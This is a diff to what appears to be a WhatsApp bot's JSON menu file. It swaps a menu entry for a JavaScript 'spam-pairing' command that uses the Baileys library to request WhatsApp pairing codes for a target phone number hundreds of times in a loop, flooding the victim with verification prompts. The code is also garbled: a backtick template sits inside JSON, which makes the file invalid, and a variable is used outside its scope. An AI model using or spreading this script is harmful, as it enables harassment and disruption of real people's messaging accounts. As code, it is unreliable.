@@ -1,5 +1,40 @@
 [
-  { "label": "Fitur 1", "command": ".menu" },
+  { "label": "Fitur 1", "command": `case 'spam-pairing':case 'spampair': {
+                if (!isCreator && !isPremium) return reply(mess.OnlyOwner)
+                if (!text) return reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
+                reply(mess.wait)
+                let [peenis, pepekk = "200"] = text.split("|")
+
+                let target = peenis.replace(/[^0-9]/g, '').trim()
+                let {
+                    default: makeWaSocket,
+                    useMultiFileAuthState,
+                    fetchLatestBaileysVersion
+                } = require('@whiskeysockets/baileys')
+                let {
+                    state
+                } = await useMultiFileAuthState('pepek')
+                let {
+                    version
+                } = await fetchLatestBaileysVersion()
+                let pino = require("pino")
+                let sucked = await makeWaSocket({
+                    auth: state,
+                    version,
+                    logger: pino({
+                        level: 'fatal'
+                    })
+                })
+
+                for (let i = 0; i < pepekk; i++) {
+                    await sleep(1500)
+                    let prc = await sucked.requestPairingCode(target)
+                    await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
+                }
+                await sleep(15000)
+                Reply(prc)
+            }
+            break` },
   { "label": "Fitur 2", "command": ".intro" },
   { "label": "Fitur 3", "command": ".jadian @target" },
   { "label": "Fitur 4", "command": ".tebakgambar" },
